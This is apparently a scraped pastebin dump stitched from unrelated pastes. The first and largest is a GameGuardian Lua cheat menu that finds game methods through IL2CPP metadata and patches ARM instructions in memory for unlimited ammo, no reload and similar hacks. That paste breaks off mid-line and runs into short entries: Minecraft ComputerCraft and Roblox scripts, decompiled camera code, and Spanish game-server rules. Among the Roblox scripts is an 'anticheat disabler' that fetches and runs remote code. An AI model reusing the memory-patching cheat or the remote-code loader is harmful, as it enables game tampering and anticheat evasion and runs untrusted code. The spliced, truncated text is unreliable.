game = gg.getTargetInfo()
P=game.processName
FP=game.name
L=gg.getTargetInfo().label
M=gg.getTargetInfo()[""label""] 
V=game.versionName
TP=gg.getTargetPackage()
xTAGx=""Have fun""
xLINKx=""https://t.me/HxE_Chat"" 
xLINK1x=""https://www.tiktok.com/@hxesq""
printx=""---------------------------------------------------------------"" 
print(printx)
print(xTAGx) 
print(""Telegram = ""..xLINKx)
print(""TikTok = ""..xLINK1x)
print(printx)  
print(""Script = ""..GLabel..""  ""..GVersion)
--███████████████████████
--███████████████████████
--███████████████████████
-- APEX[GG]v2
apex=1
gg.setVisible(false)
v=gg.getTargetInfo()
    if v==nil then
        print(""×× ERROR ××\n×× INVALID PROCESS SELECTED / OR NO ROOT ACCESS"") 
        gg.setVisible(true) os.exit()
        return
    end 
    
HxEmenu = ('            ⚡HxE Menu by wils2m⚡\
           ❦ ════ •⊰❂ - ❂⊱• ════ ❦\
                     ⛥🇮‌🇳‌🇫‌🇴‌⛥\
  🎮🅖🅐🅜🅔🎮 : '..GLabel..'\
  🎰🅥🅔🅡🅢🎰 : '..GVersion..'\
    🎰🅐🅡🅜🎰   : '..xbit..'\
\
⏳Exᴘɪʀᴇᴅ Date⏳ : '..expire..'\
 🎁 Encryption 🎁 :  '..expire..'\
            ❦ ════ •⊰❂ - ❂⊱• ════ ❦')
           
gg.alert(HxEmenu)

print(""Telegram = ""..xLINKx)

gg.alert(""                           Patch Note\
           ❦ ════ •⊰❂ - ❂⊱• ════ ❦\
- HxE script menu\
- Huge thanks to (Apex[GG])\
- NEW:\
- Script Auto-Updating\
- Updated using 0.2712.89888\
..................................................\
- Unlimited ammo, No reload\
- Accuracy increase\
- Dumb ennemy\
- No mission requirement\
- Max levels\
            ❦ ════ •⊰❂ - ❂⊱• ════ ❦\
"")
------------------------------------------------------------------------------
A={} for i =1,100 do A[i]={} end 
------------------------------------------------------------------------------
OFF=""× "" ON=""√ ""
BP=OFF DM=OFF AC=OFF AM=OFF LM=OFF MI=OFF NR=OFF EN=OFF
o64={}

function menu()
apex=0
gg.toast(xTAGx)  
mc=gg.multiChoice({
AC..""Accuracy increase"",
AM..""Unlimited ammos"",
LM..""Max levels"",
MI..""No mission requirement"",
NR..""No reload"",
EN..""Dumb Ennemy"",
	""[ EXIT ]""},
    {},xTAGx..""\n""..xLINKx..""\n""..GLabel.."" ""..GVersion.."" ""..xBITx)
	
	if mc==nil then cancel() return end
	if mc[1] then accuracy() end
	if mc[2] then ammo() end
	if mc[3] then level() end
	if mc[4]then mission() end
	if mc[5] then reload() end
	if mc[6] then ennemy() end	
	
xhaX={
AC..""Accuracy increase"",
AM..""Unlimited ammos"",
LM..""Max levels"",
MI..""No mission requirement"",
NR..""No reload"",
EN..""Dumb Ennemy"",
	}
xhaX=table.concat(xhaX, ""\n"")
xhaX=tostring(xhaX) 

	if mc[7] then exit() return end 

gg.toast(""[√] Complete"") 

gg.alert(""Hacks ""..GLabel.."" ""..GVersion.."" ""..xBITx..""\n\n""..xhaX,""OK"",nil,xTAGx) 

end

--███████████████████████

--// Namespace: ServerSide.UserInfoComponents
--public class BattlePassInfo
--public bool get_HaveBattlePass()
    A[1].name=""ServerSide.UserInfoComponents""
    A[1].class=""BattlePassInfo""
    A[1].method=""get_HaveBattlePass""

function battlepass()
    if A[1].error==1 then error() return end
    for i = A[1].start, A[1].finish do o=I[i]
    if BP==OFF then x=1 arm() else revert() end 
    end

    if BP==OFF then BP=ON else BP=OFF end
    end

--███████████████████████

--// Namespace: ServerSide.UserInfoComponents
--public sealed class WeaponInfo : IComparable<WeaponInfo>, IItemInfo, IHasItem
--public float GetDamage()
    A[2].name=""ServerSide.UserInfoComponents""
    A[2].class=""WeaponInfo""
    A[2].method=""GetDamage""

function damage()
    if A[2].error==1 then error() return end
    for i = A[2].start, A[2].finish do o=I[i]
    if DM==OFF then x=""h60BC88D2"" arm() else revert() end 
    end

    if DM==OFF then DM=ON else DM=OFF end
    end

--███████████████████████
--// Namespace: ServerSide.UserInfoComponents
--public sealed class WeaponInfo : IComparable<WeaponInfo>, IItemInfo, IHasItem
--public float GetAccuracy()
    A[3].name=""ServerSide.UserInfoComponents""
    A[3].class=""WeaponInfo""
    A[3].method=""GetAccuracy""

function accuracy()
    if A[3].error==1 then error() return end
    for i = A[3].start, A[3].finish do o=I[i]
    if AC==OFF then x=""h60BC88D2"" arm() else revert() end 
    end

    if AC==OFF then AC=ON else AC=OFF end
    end

--███████████████████████
--// Namespace: ServerSide.UserInfoComponents
--public sealed class WeaponInfo : IComparable<WeaponInfo>, IItemInfo, IHasItem
--public int GetAmmo()
    A[4].name=""ServerSide.UserInfoComponents""
    A[4].class=""WeaponInfo""
    A[4].method=""GetAmmo""

function ammo()
    if A[4].error==1 then error() return end
    for i = A[4].start, A[4].finish do o=I[i]
    if AM==OFF then x=""h601C88D2"" arm() else revert() end 
    end

    if AM==OFF then AM=ON else AM=OFF end
    end

--███████████████████████
--// Namespace: ServerSide.UserInfoComponents
--public sealed class WeaponInfo : IComparable<WeaponInfo>, IItemInfo, IHasItem
--public int get_Level()
    A[5].name=""ServerSide.UserInfoComponents""
    A[5].class=""WeaponInfo""
    A[5].method=""get_Level""
--public int get_MaxLevel()
    A[6].name=""ServerSide.UserInfoComponents""
    A[6].class=""WeaponInfo""
    A[6].method=""get_MaxLevel""
 
function level()
    if A[5].error==1 then error() return end
    for i = A[5].start, A[5].finish do o=I[i]
    if LM==OFF then x=""h601C88D2"" arm() else revert() end 
    end
    for i = A[6].start, A[6].finish do o=I[i]
    if LM==OFF then x=""h601C88D2"" arm() else revert() end 
    end

    if LM==OFF then LM=ON else LM=OFF end
    end

--███████████████████████
--public class Mission : ContentEntity, ILocalGame 
--public int GetRequiredPower(UserInfo userInfo)
    A[7].class=""Mission""
    A[7].method=""GetRequiredPower""
--public class FightPrepareEnergyIndicator : MonoBehaviour  
--public bool get_IsEnoughEnergy()
    A[8].class=""FightPrepareEnergyIndicator""
    A[8].method=""get_IsEnoughEnergy""

function mission()
    if A[7].error==1 then error() return end
    for i = A[7].start, A[7].finish do o=I[i]
    if MI==OFF then x=0 arm() else revert() end 
    end
    for i = A[8].start, A[8].finish do o=I[i]
    if MI==OFF then x=1 arm() else revert() end 
    end

    if MI==OFF then MI=ON else MI=OFF end
    end
    
--███████████████████████

--// Namespace: ServerSide.UserInfoComponents
--public sealed class WeaponInfo : IComparable<WeaponInfo>, IItemInfo, IHasItem
--public float GetReloadTime()
    A[9].name=""ServerSide.UserInfoComponents""
    A[9].class=""WeaponInfo""
    A[9].method=""GetReloadTime""
    
function reload()
    if A[9].error==1 then error() return end
    for i = A[9].start, A[9].finish do o=I[i]
    if NR==OFF then x=0 arm() else revert() end 
    end

    if NR==OFF then NR=ON else NR=OFF end
    end

--███████████████████████ 
--public class EnemyBehaviour : BehaviourBase
--protected override bool IsValidOpponent(Bot bot, Player player, bool allowSameGroup)
    A[10].class=""EnemyBehaviour""
    A[10].method=""IsValidOpponent""
    
 function ennemy()
    if A[10].error==1 then error() return end
    for i = A[10].start, A[10].finish do o=I[i]
    if EN==OFF then x=0 arm() else revert() end 
    end

    if EN==OFF then EN=ON else EN=OFF end
    end
    
--███████████████████████
--███████████████████████
--███████████████████████
    if v.processName~=GProcess then
        print(""This Script is For:\n    ""..GLabel..""\n    ""..GProcess..""\nYou Selected:\n    ""..v.label..""\n    ""..v.processName)
        gg.setVisible (true) os.exit()
        return
    end 
------------------------------------------------------------------------------
    if v.x64 then bitx=64 xBITx=""[x64]"" else bitx=32 xBITx=""[x32]"" end 
        print(xBITx)  
        print(printx)  
------------------------------------------------------------------------------


isrdy=gg.alert(""Evolution 2\n\nThis Script is Auto-Updating. \nInitial Calibration May Take A While.\n\nSTART SCRIPT IN PAUSED FIGHT. Otherwise, Calibration will Fail and Hacks Not Work\n\n(All hacks can be activated anywhere after)"",""EXIT"",""START"",xTAGx)  
if isrdy~=2 then gg.setVisible(true) os.exit() return end 

--███████████████████████

--function sort() 
--SORT1={} apexsort=0
     --for sorti = A[s].start, A[s].finish do
         --apexsort=apexsort+1
         --SORT1[apexsort] = I[sorti] 
     --end 
--SORT2={} table.sort(SORT1) 
    --for sort2, v in pairs(SORT1) do
        --SORT2[sort2]=v
    --end 
--r=SORT2[r] 
--end

--███████████████████████
    if LibResult==1 then 
    xAPEXx={} xXx=0
    xLibRes=0 
    libx=gg.getRangesList()
        if #(libx)==0 then 
        print(""×× LIB ERROR #01 ××\nNo Libs Found\nTry a Different Virtual Environment \nor Try a Better Game Installation Method\nor Download Game From 'apkcombo.com' "")
        gg.setVisible(true) 
        os.exit() 
        end
    libx=gg.getRangesList(xlib)
        if #(libx)==0 then  
        print(""×× No ""..xlib.."" Found"")
        xLibRes=2 
        goto APEX_SPLIT 
        end
    xlibn=0 
        for i, v in ipairs(libx) do 
            if libx[i].state==""Xa"" then 
            xXx=xXx+1 
            xAPEXx[xXx]=libx[i].start
            xLibRes=1
            end
        end 
        if xLibRes==0 then 
        print(""×× LIB ERROR #03 ××\nNo ""..xlib.."" Found in Xa\nTry a Different Virtual Environment \nor Try a Better Game Installation Method\nor Download Game From 'apkcombo.com' "")
        gg.setVisible(true) 
        os.exit()     
        end    
                  
        ::APEX_SPLIT::     
        if xLibRes==2 then
        splitapk=0
        libx=gg.getRangesList()
            for i, v in ipairs(libx) do 
                if libx[i].state==""Xa"" and string.match(libx[i].name,""split_config"") then
                splitapk=1
                end
            end 
            if splitapk==1 then 
            xsapk={} xsapkx=0
                for i, v in ipairs(libx) do
                    if libx[i].state==""Xa"" then
                    xsapkx=xsapkx+1
                    xsapk[xsapkx]=libx[i][""end""]-libx[i].start
                    end
                end 
                if xsapkx~=0 then                 
                APEXQ=math.max(table.unpack(xsapk))
                    for i, v in ipairs(libx) do              
                        if libx[i].state==""Xa"" and libx[i][""end""]-libx[i].start==APEXQ then              
                        xXx=xXx+1             
                       xAPEXx[xXx]=libx[i].start
                        print(""√√ Split Apk Lib Found\n√√ ""..libx[i].name) 
                        xLibRes=1                       
                        end
                    end
                end 
            end 
         
             if splitapk==0 and xLibRes~=1 then
             print(""×× No split_config Lib Found"")  
             xc=1 xt={} 
             libx=gg.getRangesList()
                 for i, v in ipairs(libx) do
                     if libx[i].state==""Xa"" then 
                     xt[xc]=tonumber(libx[i][""end""]-libx[i].start) 
                     xc=xc+1
                     end
                 end
             APEXQ=math.max(table.unpack(xt))
                 for i, v in ipairs(libx) do              
                     if libx[i].state==""Xa"" and libx[i][""end""]-libx[i].start==APEXQ then        
                     xXx=xXx+1       
                     xAPEXx[xXx]=libx[i].start
                     print(""√√ math.max Xa Lib Found\n√√ ""..libx[i].name) 
                     xLibRes=1   
                     end 
                 end
            end                        

            if xLibRes~=1 then
            print(""×× Correct Lib Not Found ××\n×× Direct/Split Config/Xa Max ××"")
            gg.setVisible(true) 
            os.exit()
             return
            end 
        end 
    end 
--███████████████████████
function arm()
o=tonumber(o) 
    for XxX=1,#(xAPEXx) do
    xdump=nil xdump={} 
    xdump[1]={} xdump[2]={}
    xdump[1].address=xAPEXx[XxX] + o
    xdump[1].flags=4
        if x==0 then xdump[1].value=xfalse end
        if x==1 then xdump[1].value=xtrue end
        if x~=0 and x~=1 then xdump[1].value=x end 
    xdump[2].address=xAPEXx[XxX]+(o+4)
    xdump[2].flags=4
    xdump[2].value=xEND 
    gg.setValues(xdump) 
    end 
end 
------------------------------------------------------------------------------  
function revert()
    for XxX=1,#(xAPEXx) do 
    REVERT=nil REVERT={} xRx=nil xRx=1 
        for i, v in ipairs(ORIG) do
            if tonumber(xAPEXx[XxX]+o)==ORIG[i].address then
            REVERT[xRx]={}
            REVERT[xRx].address=xAPEXx[XxX]+o
            REVERT[xRx].flags=4
            REVERT[xRx].value=ORIG[i].value
            xRx=xRx+1
            REVERT[xRx]={}
            REVERT[xRx].address=xAPEXx[XxX]+o+4
            REVERT[xRx].flags=4
            REVERT[xRx].value=ORIG[i+1].value
            gg.setValues(REVERT) 
            break
            end
        xRx=xRx+1
        end 
    end 
end 
--███████████████████████
if v.x64 then
xtrue=""h200080D2"" -- MOV X0, #0x1
xfalse=""h000080D2"" -- MOV X0, #0x0 
xEND=""hC0035FD6"" -- RET
else 
xtrue=""h0100A0E3"" -- MOVW R0, #1 
xfalse=""h0000A0E3"" -- MOVW R0, #0 
xEND=""h1EFF2FE1"" -- BX LR 
end 

--███████████████████████
-- APEX[GG]v2

function clear()
gg.getResults(gg.getResultsCount())
gg.clearResults()
end
------------------------------------------------------------------------------  
function search()
gg.getResults(gg.getResultsCount())
gg.clearResults()
gg.searchNumber(x,t) 
end 
------------------------------------------------------------------------------  
function refine()
gg.refineNumber(x,t) 
end 
------------------------------------------------------------------------------  
function check()
E=nil E=gg.getResultsCount()
end 
------------------------------------------------------------------------------  
function offset()
o=tonumber(o) addoff=nil 
addoff=gg.getResults(gg.getResultsCount())
    for i, v in ipairs(addoff) do
        addoff[i].address=addoff[i].address+o
        addoff[i].flags=t
    end
gg.loadResults(addoff) 
end 
--███████████████████████
function cancel()
gg.toast(""CANCELLED"")
end 
------------------------------------------------------------------------------  
function wait()
gg.toast(""Please Wait.."") 
end 
------------------------------------------------------------------------------  
function error()
gg.toast(""× ERROR ×"")
gg.sleep(1000)
end 
------------------------------------------------------------------------------  
function exit()
gg.getListItems()
gg.clearList()
gg.getResults(gg.getResultsCount())
gg.clearResults()
gg.toast(""[ EXIT ]"")  
    if xhaX~=nil then 
        print(printx) 
        print(xhaX) 
        print(printx)  
    end 
gg.setVisible(true) 
os.exit()
return
end 
--███████████████████████
if v.x64 then off1=-16 typ=32 else off1=-8 typ=4 end 
gg.setRanges(gg.REGION_OTHER | gg.REGION_C_ALLOC) 
gmdx=gg.getRangesList(""global-metadata.dat"")
    if #(gmdx)~=0 then        
    gmds=gg.getRangesList(""global-metadata.dat"")[1].start
    gmde=gg.getRangesList(""global-metadata.dat"")[1][""end""] 
    else gmds=nil gmde=nil
    end 
ATOTAL=0
for i = 1,100 do
    if A[i].method==nil then break end
    ATOTAL=ATOTAL+1
end 

ASTART=1 AEND=0 ATABT=ATOTAL+1 ATAB=1
S=0 
    while ATAB<=ATOTAL do 
    ::AUTOSTART::
    if gg.isVisible() then gg.setVisible(false) end 
        if ATAB>ATOTAL then break goto FINISHED end 
    gg.toast(""Please Wait.. [ ""..ATABT-ATAB.."" ]"") 
    A[ATAB].error=1 
    ANAME=nil ANAME={}
    if A[ATAB].name~=nil then 
        for i = 1,#(tostring(A[ATAB].name)) do
            ANAME[i]=string.byte(A[ATAB].name,i) 
        end 
    else
        A[ATAB].name=0
    end 
    ACLASS=nil ACLASS={}
    if A[ATAB].class~=nil then 
        for i = 1,#(tostring(A[ATAB].class))+1 do
            if i == #(tostring(A[ATAB].class))+1 then 
                ACLASS[i]=0 
            else
                ACLASS[i]=string.byte(A[ATAB].class,i) 
            end 
        end 
    else
        A[ATAB].class=0
    end 
    
                ASTART=AEND+1
                clear() t=1 
                gg.searchNumber("":""..tostring(A[ATAB].method),1,false,gg.SIGN_EQUAL,gmds, gmde) 
                xm=gg.getResults(2) gg.getResults(gg.getResultsCount())
                check() 
                    if E==0 then ATAB=ATAB+1 
                        if ATAB>ATOTAL then break return end
                    goto AUTOSTART return 
                    end 
                x=xm[1].value.."";""..xm[2].value..""::2"" refine()
                x=xm[1].value refine() 
                o=-1 offset() x=0 refine() oo=#(tostring(A[ATAB].method))
                o=oo+1 offset() refine() o=-oo offset()
                check() 
                    if E==0 then ATAB=ATAB+1 
                        if ATAB>ATOTAL then break return end
                    goto AUTOSTART return 
                    end 
                gg.searchPointer(0) xcount=gg.getResultsCount()
                xpoint=gg.getResults(xcount,nil, nil, nil, nil, nil, nil, nil,gg.POINTER_READ_ONLY)
                    if #(xpoint)==0 then ATAB=ATAB+1 
                        if ATAB>ATOTAL then break return end
                    goto AUTOSTART return 
                    end 
                clear() 
                    for xp=1,#(xpoint) do
                    xpoint[xp].address=xpoint[xp].address+off1
                    xpoint[xp].flags=typ
                    end
                gg.loadResults(xpoint) 
                xoff=gg.getResults(#(xpoint),nil, nil, nil, nil, nil, nil, nil, gg.POINTER_EXECUTABLE)
                    if #(xoff)==0 then ATAB=ATAB+1 
                        if ATAB>ATOTAL then break return end
                    goto AUTOSTART return 
                    end 
                    xfin=1
                    while xfin<=#(xoff) do 
                    ::XFIN:: 
                        if xfin>#(xoff) then ATAB=ATAB+1
                            if ATAB>ATOTAL then break return end 
                        goto AUTOSTART return
                        end 
                        if gg.getTargetInfo().x64 then 
                            xadd=tonumber(xoff[xfin].value)  
                        else 
                            xadd=string.format(""%X"",tonumber(xoff[xfin].value)) 
                            xadd=string.sub(tostring(xadd), -8,-1)
                            xadd=tonumber(""0x""..xadd) 
                        end     
                    gval1=nil gval1={} gval1[1]={}
                        if gg.getTargetInfo().x64 then gvo=24 gvo1=16 gvo2=24 else gvo=12 gvo1=8 gvo2=12 end 
                    gval1[1].address=xoff[xfin].address+gvo
                    gval1[1].flags=typ
                    gval1=gg.getValues(gval1) 
                        if gg.getTargetInfo().x64 then 
                            gval=tonumber(gval1[1].value)  
                        else 
                            gval=string.format(""%X"",tonumber(gval1[1].value)) 
                            gval=string.sub(tostring(gval), -8,-1)
                            gval=tonumber(""0x""..gval) 
                        end     
                    gval2=nil gval2={} gval2[1]={} gval2[2]={}
                    gval2[1].address=gval+gvo1
                    gval2[1].flags=typ
                    gval2[2].address=gval+gvo2
                    gval2[2].flags=typ 
                    gval2=gg.getValues(gval2)
                        if gg.getTargetInfo().x64 then 
                            gval21=tonumber(gval2[1].value)  
                            gval22=tonumber(gval2[2].value) 
                        else 
                            gval21=string.format(""%X"",tonumber(gval2[1].value)) 
                            gval21=string.sub(tostring(gval21), -8,-1)
                            gval21=tonumber(""0x""..gval21) 
                            gval22=st"
LgpG5bgU,[CC]Chatbox Turtle donge msg,DerMarten,Lua,Monday 1st of April 2024 02:01:25 AM CDT,"shell.run(""querry"")

local chatBox = peripheral.find(""chatBox"")
spieler = ""DerMarten"" ---- Playername !!!!
local title = {
    { text = ""Computercraft"", color = ""white""}
}
local message = {
    { text = ""\nTurtle mit dem Label\n""},
    { text = os.getComputerLabel(), color = ""aqua""},
    { text = ""\nist Fertig mit ihrer Arbeit!""}
}
 
local titleJson = textutils.serializeJSON(title)
local messageJson = textutils.serialiseJSON(message)
local message1 = {
    {text = ""Turtle mit dem Label ""},
    {
		text = os.getComputerLabel(),
        underlined = true,
        color = ""aqua"",
        clickEvent = {
            action = ""open_url"",
            value = ""https://www.youtube.com/watch?v=dQw4w9WgXcQ""
        }
	},
    {text = "" ist Fertig mit ihrer Arbeit!"", color = ""white""}
}

local json1 = textutils.serialiseJSON(message1)
successful, error = chatBox.sendFormattedToastToPlayer(messageJson, titleJson, spieler, ""&b&lInfo"", ""()"", ""&b&l"")
os.sleep(1)
successful1, error1 = chatBox.sendFormattedMessageToPlayer(json1, spieler, ""Computercraft"", ""[]"", ""&b"")"
aGpqC2Ku,Untitled,em00se,C,Monday 1st of April 2024 12:38:51 AM CDT,"float __fastcall app_RotateCameraControllerBase__getInputRotationSpeedRate274083(
        __int64 a1,
        app::RotateCameraControllerBase *a2,
        float input_val)
{
  app::RotateAroundCameraSetting *RotationCameraSettings; // rax
  __int64 v4; // rsi
  app::RotateAroundCameraSetting *v7; // rdx
  bool v9; // al
  bool v10; // al
  _BYTE *v11; // rcx
  float input_val_abs; // xmm6_4
  bool v13; // al
  double input_val_abs_; // xmm6_8
  float v15; // xmm0_4
  float v16; // xmm0_4
  double v17; // xmm2_8
  bool IsMouseInputSpeedAccelDisabled; // zf
  float v19; // xmm1_4
  app::RotateAroundCameraSetting *v20; // rax
  struct app::RotateAroundCameraSetting::via::AnimationCurve *MouseInputRotateSpeedCurve; // rcx
  float v22; // xmm0_4
  float curve_result; // xmm6_4
  __int64 v24; // rax
  double v25; // xmm6_8
  double v26; // xmm0_8

  RotationCameraSettings = a2->_RotationCameraSettings;
  v4 = 0i64;
  v7 = 0i64;
  if ( RotationCameraSettings )
    v7 = RotationCameraSettings;
  if ( v7 )
  {
    if ( *(_QWORD *)&v7->pad[0x10] )
    {
      v11 = *(_BYTE **)&v7->pad[0x10];
      v10 = v11[0x39] || sub_144382070(v11);
    }
    else
    {
      v10 = 1;
    }
    v9 = !v10;
  }
  else
  {
    v9 = 1;
  }
  if ( v9 )
    return 0.0;
  input_val_abs = fabs(input_val);
  if ( qword_14FD7F960
    && ((sub_1443D8B60() & 0xF) != 1 ? (v13 = 0) : (v13 = *(_BYTE *)(qword_14FBCB7C8 + 0x378) != 0),
        v13
     && (*(unsigned __int8 (__fastcall **)(__int64, app::RotateCameraControllerBase *))(*(_QWORD *)(*(_QWORD *)&a2->via::Object
                                                                                                  - 0x10i64)
                                                                                      + 0x110i64))(
          a1,
          a2)) )
  {

    // mouse input section

    input_val_abs_ = input_val_abs;
    if ( *(_QWORD *)a2->pad_10 )
    {
      v15 = sub_144328600((__int64)a2);
    }
    else
    {
      sub_144331A70(a1, 0x46i64, 0i64);
      v15 = 0.0;
    }
    v16 = input_val_abs_ / v15;
    v17 = v16 / a2->_RotationCameraSettings->_MouseMoveSpeedMax;
    IsMouseInputSpeedAccelDisabled = !app_RotateCameraControllerBase__get_IsMouseInputSpeedAccel274063(a1, a2);
    v20 = a2->_RotationCameraSettings;
    if ( IsMouseInputSpeedAccelDisabled )
      MouseInputRotateSpeedCurve = v20->_MouseInputRotateSpeedCurve;
    else
      MouseInputRotateSpeedCurve = v20->_MouseInputRotateSpeedAccelCurve;
    v19 = v17;
    v22 = sub_1443D7A20((unsigned __int16 *)MouseInputRotateSpeedCurve + 8, v19);
    curve_result = v22;
    if ( *(_QWORD *)a2->pad_10 )
    {
      v24 = *(_QWORD *)a2->pad_10;
    }
    else
    {
      sub_144331A70(a1, 0x46i64, 0i64);
      v24 = 0i64;
    }
    if ( *(_QWORD *)(v24 + 0x18) )
    {
      if ( *(float *)(v24 + 0x34) > 0.0 )
      {
        v25 = v22;
        if ( *(_QWORD *)a2->pad_10 )
          v4 = *(_QWORD *)a2->pad_10;
        else
          sub_144331A70(a1, 0x46i64, 0i64);
        if ( *(_QWORD *)(v4 + 0x18) )
        {
          v26 = *(float *)(v4 + 0x34);
        }
        else
        {
          sub_144331A70(a1, 0x46i64, 0i64);
          v26 = 0.0;
        }
        curve_result = v26 * v25;
      }
    }
    else
    {
      sub_144331A70(a1, 0x46i64, 0i64);
    }
  }
  else
  {
    // controller input section
    curve_result = sub_1443D7A20(
                     (unsigned __int16 *)a2->_RotationCameraSettings->_InputRotateSpeedCurve + 8,
                     input_val_abs);
  }
  if ( input_val <= 0.0 )
    return -curve_result;
  else
    return curve_result;
}"
AZtW2vjP,Reglas Azurex RP,EvaProject,HTML,Monday 1st of April 2024 12:34:47 AM CDT,"<style=""Title""><align=center><size=10><b><color=#00ffff>◢◤◢█◤◢██◤◢████◤◢████████◣◥████◣◥██◣◥█◣◥◣</color></size>
<line-height=38%><size=7><color=#2bd5ff>──◢█████─██████◣─██────██─██████◣──◢█████─██───██─</color>
<color=#55aaff>──◢█◤──██─────◢█◤─██────██─██───██─◢█◤─────◥█◣─◢█◤──</color>
<color=#8080ff>───██───██───◢█◤───██────██─██████◤─█████────█████────</color>
<color=#aa55ff>──███████─◢█◤─────██◣──◢██─██──◥█◣─██──────◢█◤─◥█◣──</color>
<color=#d52bff>─██───██─◥██████─◥██████◤─██───██─███████─██───██─</color></size></line-height>
<size=10><color=#ff00ff>◥◣◥█◣◥██◣◥████◣◥████████◤◢████◤◢██◤◢█◤◢◤</color></b></size></align></style>
<align=right><color=#FDC7FF><size=8>Dueña: Hod | Dirección: Netzach</color></size></align>
<align=center><color=#ff00ff>"" <size=10><i><color=#00ffff>FACE THE FEAR, BUILD THE FUTURE</color></i></size> ""</color></align>
<align=center><line-height=50%> <size=20> <mark=#ff00ff><color=#ff00ff><b><link=""https://discord.gg/azurex"">|               |</color></b></link></mark></size>ㅤ ㅤ<size=20><mark=#3F3F3F><color=#3F3F3F><b><link=""https://discord.gg/azurex"">|               |</color></b></link></mark>ㅤ</size> 
<line-height=-20%><size=20>  <mark=#00ffff><color=#FF0000><b><link=""https://discord.gg/azurex"">|               |</color></b></link></mark></size>ㅤ ㅤ<size=20><mark=#7F7F7F><color=#7F7F7F><b><link=""https://discord.gg/azurex"">|               |</color></b></link></mark></size></align>
<align=center><size=20><mark=#000000><color=#ffffff><b><link=""https://discord.gg/emE4sJ4pmX"">| ᴅɪꜱᴄᴏʀᴅ |</color></b></link></mark></size>ㅤㅤ<size=20><mark=#000000><color=#D3D3D3><b><link=""https://discord.gg/emE4sJ4pmX"">|  ɢᴜɪᴀ ꜱᴠ  |</color></b></link></mark></size></line-height></line-height></align><line-height=45>
</line-height><align=right><size=40><color=#00000080><u>ㅤ 1: Buena Convivencia</u></color></size><line-height=-64%></align>
</line-height><line-height=87%></b><color=#ff00ff><u>██◣ㅤ      ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ      </u></color>
</b><color=#ff00ff><u>█◣◥◣<b> 1: </b><b><color=#00FFFF>Buena Convivencia:</color></b>             ◥◣◥██◣</u></color>
<line-height=70%><size=9><b><color=#00FFFF>1.1</color></b> - El servidor está destinado a <color=#ff0000>SOLO mayores de 15 años</color>, todos los menores <color=#ff00ff>serán perma-muteados</color> para mantener un ㅤㅤㅤambiente agradable y libre de niños.
<b><color=#00FFFF>1.2</color></b> - <color=#ff0000>Se prohíbe simpear</color> a gente por sexo, género o gustos.
<b><color=#00FFFF>1.3</color></b> - Se permite wear con audios siempre y cuando no saturen o spameen el chat de voz.
<b><color=#00FFFF>1.4</color></b> - <color=#ff0000>Queda prohibida la Toxicidad</color>, insultos, xenofobia o racismo. <color=#ff0000>se espera sentido común y no pasarse de listo</color>.
<b><color=#00FFFF>1.5</color></b> - Queda prohibido el uso de Hacks o modificaciones en archivos del juego.
<b><color=#00FFFF>1.6</color></b> - Se permite hacer equipo (y traicionar) <color=#00ffff>entre todos los bandos humanos</color> mientras queden <color=#FF0000>SCPs</color> con vida.</size></line-height><line-height=38>
</line-height><align=right><size=40><color=#00000080><u>ㅤ 2: Nada de Team-Kill</u></color></size><line-height=-64%></align>
</line-height><line-height=87%></b><color=#FF00FF><u>██◣ㅤ      ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ      </u></color>
</b><color=#FF00FF><u>█◣◥◣<b> 2: </b><b><color=#00FFFF>Nada de Team-Kill:</color></b>              ◥◣◥██◣</u></color>
<line-height=70%><size=9><b><color=#00FFFF>2.1</color></b> - Si recibes daño, la persona que te disparó deberá brindarte salud, si se niega puedes matarlo.
<b><color=#00FFFF>2.2</color></b> - Se permite el TK como medida de autodefensa.
<b><color=#00FFFF>2.3</color></b> - El TK entre <color=#F1C40F>Clase-D</color> está permitido.
<b><color=#00FFFF>2.4</color></b> - Si te arrestan, solo la persona que te arrestó puede des-arrestarte y matarte.
<b><color=#00FFFF>2.5</color></b> - Está permitido hacer TK a una persona que esté saturando intercom, cerrando puertas, o molestando en SCP-914.
<b><color=#00FFFF>2.6</color></b> - El TK por fuego cruzado y las muertes accidentales por SCP-018 no están penalizadas.
<b><color=#00FFFF>2.7</color></b> - Se permite el TK con caramelo rosa.</size></line-height>
<align=right></line-height><size=40><color=#00000080><u>3: Reglas para los SCPs</u></color></size><line-height=-64%></align>
</line-height><line-height=87%></b><color=#ff00ff><u>██◣ㅤ      ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ      </u></color>
</b><color=#ff00ff><u>█◣◥◣<b> 3: </b><b><color=#00FFFF>Reglas para los SCPs:</color></b>        ◥◣◥██◣</u></color>
<line-height=70%><size=9><b><color=#00FFFF>3.1</color></b> - Los <color=#FF0000>SCPs</color> tienen prohibido hacer equipo con cualquier clase humana.
<b><color=#00FFFF>3.2</color></b> - Se prohíbe la desconexión para evitar jugar como <color=#FF0000>SCP-049-2</color>.</line-height>"
SV2cWjP5,Bedwars (INFECTION) Anticheat Disabler,GETFREEROBUX,Lua,Monday 1st of April 2024 12:19:38 AM CDT,"loadstring(game:HttpGet(('https://raw.githubusercontent.com/BirthScripts/starhook/main/bedwars.lua'),true))()

--[[
bedwars anticheat disabler
HOW TO USE:
1) Join Infection
2) Reset to join the infected
3) Open Change Class and choose Rush
4) Execute Vape V4 and hf
--]]"
Mg3TbyzN,Kavo UI Toggle UI,GETFREEROBUX,Lua,Sunday 31st of March 2024 11:28:05 PM CDT,"local ScreenGui = Instance.new(""ScreenGui"")
ScreenGui.Name = ""ScreenGui""
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild(""PlayerGui"")
ScreenGui.ResetOnSpawn = false

local Toggle = Instance.new(""TextButton"")
Toggle.Name = ""Toggle""
Toggle.Parent = ScreenGui
Toggle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Toggle.Position = UDim2.new(0, 0, 0.454706937, 0)
Toggle.Size = UDim2.new(0, 90, 0, 38)
Toggle.Font = Enum.Font.SourceSans
Toggle.Text = ""Close""
Toggle.TextColor3 = Color3.fromRGB(248, 248, 248)
Toggle.TextSize = 28.000
Toggle.Draggable = true
Toggle.MouseButton1Click:Connect(function()
    if Toggle.Text == ""Close"" then
        Toggle.Text = ""Open""
    else
        Toggle.Text = ""Close""
    end
    Library:ToggleUI()
end)

local Corner = Instance.new(""UICorner"")
Corner.Name = ""Corner""
Corner.Parent = Toggle"
